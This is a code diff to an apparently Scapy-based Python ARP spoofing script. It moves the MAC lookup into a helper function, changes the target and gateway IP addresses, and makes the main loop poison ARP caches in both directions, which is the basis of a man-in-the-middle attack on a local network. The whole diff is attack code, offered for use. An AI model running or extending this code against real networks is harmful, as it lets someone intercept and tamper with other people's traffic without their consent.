@@ -11,17 +11,21 @@ def get_mac(ip):
         return reply[0][1].src
     return None
 
-default_gateway_ip = "192.168.137.255"
-target_ip = "192.168.68.108"
-target_mac = None
+def wait_till_mac_founf(ip):
+    mac = None
+    while not mac:
+        mac = get_mac(ip)
+        if not mac:
+            print("MAC adress for {} was not found".format(ip))
+            exit(1)
+    print("The target MAC adress is: {}".format(mac))
+    return mac
+
+default_gateway_ip = "192.168.68.1"
+target_ip = "192.168.68.100"
 
 if __name__ == "__main__":
-    while not target_mac:
-        target_mac = get_mac(target_ip)
-        if not target_mac:
-            print("MAC adress was not found")
-            exit(1)
-    print("The target MAC adress is: {}".format(target_mac))
     while True:
-        spoof(target_ip, target_mac, default_gateway_ip)
+        spoof(target_ip, wait_till_mac_founf(target_ip), default_gateway_ip)
+        spoof(default_gateway_ip, wait_till_mac_founf(default_gateway_ip), target_ip)
         print("Spoofing is active")
